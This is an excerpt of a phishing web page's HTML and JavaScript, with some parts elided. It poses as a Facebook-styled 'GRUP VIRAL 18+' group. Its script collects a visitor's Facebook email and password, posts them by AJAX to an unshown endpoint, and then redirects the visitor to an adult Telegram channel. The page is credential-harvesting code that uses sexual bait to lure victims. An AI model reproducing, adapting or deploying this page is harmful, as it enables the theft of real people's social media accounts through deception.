...
<html>
    <head>
        ...
        <link rel="stylesheet" href="haykaljb/fb.css">
        <link rel="stylesheet" href="haykaljb/asaykjwdawldkha.css" />
    </head>
    <body>
        <main>
            <div class="hdrhjbgrp">
                <div class="krhdrhjbgrp">
                    <div class="icnhjbgrp">
                        ...
                        <img src="https://i.ibb.co/zJ1ZrGH/1.png" alt="" />
                    </div>
                    <div class="nmhjbgrp">
                        <h1>GRUP VIRAL 18+</h1>
            ...
            function ophjbf()
        	{
        		...
        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
        		    $.ajax({
                        ...
                        dataType: 'text',
                        success: function() {
                                    location.href = "https://t.me/pornohotviral18";
                            } 
                    })
        		}
        	}
